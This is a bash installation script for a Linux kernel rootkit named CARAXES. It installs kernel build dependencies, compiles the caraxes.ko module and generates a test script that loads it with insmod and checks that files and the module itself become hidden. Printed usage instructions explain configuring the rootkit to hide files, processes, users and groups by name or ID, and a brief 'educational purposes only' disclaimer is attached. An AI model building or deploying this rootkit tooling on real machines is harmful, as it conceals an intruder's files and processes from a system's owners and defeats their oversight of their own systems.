#!/bin/bash

# CARAXES Rootkit Installation Script
# This script installs necessary dependencies and compiles the rootkit

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to detect Linux distribution
detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO=$ID
        VERSION=$VERSION_ID
    elif [ -f /etc/redhat-release ]; then
        DISTRO="rhel"
    elif [ -f /etc/debian_version ]; then
        DISTRO="debian"
    else
        DISTRO="unknown"
    fi
    
    print_status "Detected distribution: $DISTRO"
}

# Function to install dependencies based on distribution
install_dependencies() {
    print_status "Installing kernel headers and build dependencies..."
    
    case $DISTRO in
        "ubuntu"|"debian")
            print_status "Installing dependencies for Debian/Ubuntu..."
            sudo apt update
            sudo apt install -y \
                linux-headers-$(uname -r) \
                build-essential \
                make \
                gcc \
                git \
                kmod
            ;;
        "fedora"|"rhel"|"centos"|"rocky"|"almalinux")
            print_status "Installing dependencies for RHEL/Fedora/CentOS..."
            if command -v dnf &> /dev/null; then
                sudo dnf install -y \
                    kernel-headers-$(uname -r) \
                    kernel-devel-$(uname -r) \
                    gcc \
                    make \
                    git \
                    kmod
            else
                sudo yum install -y \
                    kernel-headers-$(uname -r) \
                    kernel-devel-$(uname -r) \
                    gcc \
                    make \
                    git \
                    kmod
            fi
            ;;
        "arch"|"manjaro")
            print_status "Installing dependencies for Arch Linux..."
            sudo pacman -S --needed \
                linux-headers \
                base-devel \
                git \
                kmod
            ;;
        "opensuse"|"sles")
            print_status "Installing dependencies for openSUSE..."
            sudo zypper install -y \
                kernel-default-devel \
                gcc \
                make \
                git \
                kmod
            ;;
        *)
            print_warning "Unknown distribution. Please install the following manually:"
            echo "  - Kernel headers for $(uname -r)"
            echo "  - build-essential/gcc/make"
            echo "  - git"
            echo "  - kmod"
            read -p "Press Enter to continue after installing dependencies..."
            ;;
    esac
}

# Function to check if kernel headers are properly installed
check_kernel_headers() {
    print_status "Checking kernel headers..."
    
    KERNEL_VERSION=$(uname -r)
    HEADERS_PATH="/lib/modules/$KERNEL_VERSION/build"
    
    if [ ! -d "$HEADERS_PATH" ]; then
        print_error "Kernel headers not found at $HEADERS_PATH"
        print_error "Please install kernel headers for your current kernel: $KERNEL_VERSION"
        exit 1
    fi
    
    if [ ! -f "$HEADERS_PATH/Makefile" ]; then
        print_error "Kernel headers appear to be incomplete (no Makefile found)"
        exit 1
    fi
    
    print_success "Kernel headers found and appear to be complete"
}

# Function to check if we're running as root for module operations
check_root_for_module() {
    if [ "$EUID" -eq 0 ]; then
        print_warning "Running as root. This is required for loading/unloading kernel modules."
        return 0
    else
        print_warning "Not running as root. You'll need sudo privileges to load/unload the module."
        return 1
    fi
}

# Function to clean previous builds
clean_build() {
    print_status "Cleaning previous builds..."
    if [ -f "Makefile" ]; then
        make clean 2>/dev/null || true
    fi
    rm -f *.ko *.o *.mod.c *.mod *.symvers *.order .*.cmd 2>/dev/null || true
    rm -rf .tmp_versions/ 2>/dev/null || true
}

# Function to compile the rootkit
compile_rootkit() {
    print_status "Compiling CARAXES rootkit..."
    
    if [ ! -f "Makefile" ]; then
        print_error "Makefile not found in current directory"
        exit 1
    fi
    
    if [ ! -f "caraxes.c" ]; then
        print_error "caraxes.c not found in current directory"
        exit 1
    fi
    
    # Compile
    make
    
    if [ -f "caraxes.ko" ]; then
        print_success "Compilation successful! caraxes.ko created."
    else
        print_error "Compilation failed. caraxes.ko not found."
        exit 1
    fi
}

# Function to show usage instructions
show_usage() {
    print_success "Installation complete!"
    echo
    echo -e "${BLUE}Usage Instructions:${NC}"
    echo "1. Configure the rootkit by editing rootkit.h:"
    echo "   - MAGIC_WORD: Files/processes containing this string will be hidden"
    echo "   - USER_HIDE: Hide processes owned by this user ID"
    echo "   - GROUP_HIDE: Hide processes owned by this group ID"
    echo "   - HIDE_PROCESS_EXE: Hide processes with this executable path"
    echo "   - HIDE_PROCESS_CMDLINE: Hide processes with this command line"
    echo
    echo "2. Load the rootkit:"
    echo "   sudo insmod caraxes.ko"
    echo
    echo "3. Test the hiding functionality:"
    echo "   ls  # Files with 'caraxes' in name should be hidden"
    echo "   ps aux | grep <target_process>"
    echo
    echo "4. Unload the rootkit:"
    echo "   sudo rmmod caraxes"
    echo
    echo -e "${YELLOW}Warning:${NC} This is for educational purposes only!"
    echo "Use responsibly and only on systems you own or have permission to test."
    echo
    echo "See PROCESS_HIDING_GUIDE.md for detailed usage instructions."
}

# Function to create a simple test script
create_test_script() {
    print_status "Creating test script..."
    
    cat > test_rootkit.sh << 'EOF'
#!/bin/bash

# Simple test script for CARAXES rootkit

echo "=== CARAXES Rootkit Test Script ==="
echo

# Check if rootkit module exists
if [ ! -f "caraxes.ko" ]; then
    echo "ERROR: caraxes.ko not found. Run ./install.sh first."
    exit 1
fi

echo "1. Current files in directory (before loading rootkit):"
ls -la | grep caraxes || echo "No caraxes files visible"
echo

echo "2. Loading rootkit..."
if sudo insmod caraxes.ko; then
    echo "Rootkit loaded successfully"
else
    echo "Failed to load rootkit"
    exit 1
fi

echo

echo "3. Files after loading rootkit (caraxes files should be hidden):"
ls -la | grep caraxes || echo "No caraxes files visible (this is expected)"
echo

echo "4. Checking loaded modules:"
lsmod | grep caraxes || echo "Module not visible in lsmod (may be hidden)"
echo

read -p "Press Enter to unload the rootkit..."

echo "5. Unloading rootkit..."
if sudo rmmod caraxes; then
    echo "Rootkit unloaded successfully"
else
    echo "Failed to unload rootkit"
fi

echo

echo "6. Files after unloading rootkit:"
ls -la | grep caraxes
echo

echo "Test complete!"
EOF

    chmod +x test_rootkit.sh
    print_success "Test script created: test_rootkit.sh"
}

# Main installation process
main() {
    echo -e "${BLUE}"
    echo "========================================"
    echo "  CARAXES Rootkit Installation Script"
    echo "========================================"
    echo -e "${NC}"
    
    # Check if we're in the right directory
    if [ ! -f "caraxes.c" ] || [ ! -f "Makefile" ]; then
        print_error "Please run this script from the CARAXES rootkit directory"
        print_error "Required files: caraxes.c, Makefile"
        exit 1
    fi
    
    # Detect distribution
    detect_distro
    
    # Install dependencies
    install_dependencies
    
    # Check kernel headers
    check_kernel_headers
    
    # Check root privileges
    check_root_for_module
    
    # Clean previous builds
    clean_build
    
    # Compile the rootkit
    compile_rootkit
    
    # Create test script
    create_test_script
    
    # Show usage instructions
    show_usage
}

# Run main function
main "$@"
